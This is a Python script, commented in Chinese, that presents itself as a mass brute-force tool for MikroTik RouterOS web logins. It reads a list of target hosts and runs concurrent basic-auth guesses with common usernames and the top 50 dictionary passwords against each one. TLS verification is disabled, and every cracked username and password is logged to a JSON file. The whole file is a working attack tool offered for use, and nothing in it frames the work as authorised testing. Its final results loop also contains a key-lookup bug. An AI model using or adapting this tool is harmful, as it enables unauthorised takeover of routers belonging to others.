#!/usr/bin/env python3
"""
RouterOS 大批量目标爆破工具
专为批量扫描优化
"""

import requests
import sys
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import urllib3
urllib3.disable_warnings()

class BatchMassAttack:
    def __init__(self, dict_file="routeros_premium_dict.txt", timeout=8):
        self.timeout = timeout
        self.load_dict(dict_file)
        self.results = []
        
        # 精简用户名列表（批量时只用最常见的）
        self.usernames = ["admin", "root", "user"]
    
    def load_dict(self, filename):
        """加载字典"""
        try:
            with open(filename) as f:
                self.passwords = [line.strip() for line in f if line.strip() and not line.startswith("#")]
            print(f"[+] 字典加载成功: {len(self.passwords)} 个密码")
        except:
            print("[-] 字典文件不存在，使用默认密码")
            self.passwords = ["admin", "password", "123456", "mikrotik", "router"]
    
    def try_login(self, target, username, password):
        """尝试登录"""
        try:
            resp = requests.get(
                target,
                auth=(username, password),
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )
            
            # 严格判断
            if resp.status_code == 200:
                # 排除登录页面
                if "login" in resp.text.lower() and "password" in resp.text.lower():
                    return False
                # 确认成功标志
                if any(kw in resp.text.lower() for kw in ["logout", "dashboard", "interface"]):
                    return True
                # 保守判断
                return False
            
            if resp.status_code == 302:
                location = resp.headers.get("Location", "")
                if "login" not in location.lower():
                    return True
        except:
            pass
        
        return False
    
    def attack_single_target(self, target):
        """攻击单个目标"""
        target = target.strip()
        if not target.startswith("http"):
            target = "http://" + target
        
        # 快速测试（只用前50个最常见密码）
        quick_passwords = self.passwords[:50]
        
        for username in self.usernames:
            for password in quick_passwords:
                if self.try_login(target, username, password):
                    result = {
                        "target": target,
                        "username": username,
                        "password": password,
                        "timestamp": datetime.now().isoformat()
                    }
                    print(f"[+++ 成功!] {target} -> {username}:{password}")
                    self.results.append(result)
                    return result
        
        return None
    
    def batch_attack(self, targets, workers=20):
        """批量攻击"""
        print(f"\n[+] 批量攻击模式")
        print(f"[+] 目标数量: {len(targets)}")
        print(f"[+] 字典大小: {len(self.passwords)} 个密码")
        print(f"[+] 用户名: {len(self.usernames)} 个")
        print(f"[+] 并发数: {workers}")
        print(f"[+] 每个目标测试: TOP50密码")
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[+] 开始时间: {ts}\n")
        
        completed = 0
        with ThreadPoolExecutor(max_workers=workers) as executor:
            future_to_target = {
                executor.submit(self.attack_single_target, t): t 
                for t in targets
            }
            
            for future in as_completed(future_to_target):
                target = future_to_target[future]
                completed += 1
                
                try:
                    result = future.result()
                    if not result:
                        print(f"[{completed}/{len(targets)}] {target} - 失败")
                except Exception as e:
                    print(f"[{completed}/{len(targets)}] {target} - 错误: {e}")
        
        return self.results
    
    def save_results(self, filename="batch_results.json"):
        """保存结果"""
        with open(filename, "w") as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        print(f"\n[+] 结果已保存: {filename}")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description="RouterOS 大批量爆破工具")
    parser.add_argument("-f", "--file", required=True, help="目标列表文件")
    parser.add_argument("-d", "--dict", default="routeros_premium_dict.txt", help="密码字典")
    parser.add_argument("-w", "--workers", type=int, default=20, help="并发数")
    parser.add_argument("-o", "--output", default="batch_results.json", help="输出文件")
    parser.add_argument("-t", "--timeout", type=int, default=8, help="超时时间")
    
    args = parser.parse_args()
    
    # 加载目标列表
    with open(args.file) as f:
        targets = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    
    print(f"[+] 加载了 {len(targets)} 个目标")
    
    # 执行批量攻击
    attacker = BatchMassAttack(dict_file=args.dict, timeout=args.timeout)
    results = attacker.batch_attack(targets, workers=args.workers)
    
    # 保存结果
    attacker.save_results(args.output)
    
    # 输出统计
    print("\n" + "="*60)
    print("批量攻击完成!")
    print("="*60)
    print(f"总目标数: {len(targets)}")
    print(f"成功数量: {len(results)}")
    print(f"成功率: {len(results)*100//len(targets) if targets else 0}%")
    print("="*60)
    
    if results:
        print("\n成功破解的目标:")
        for r in results:
            print(f"  {r[target]} -> {r[username]}:{r[password]}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        main()
    else:
        print("[+] RouterOS 大批量爆破工具")
        print("[+] 用法: python3 batch_mass_attack.py -f targets.txt -d dict.txt -w 30")
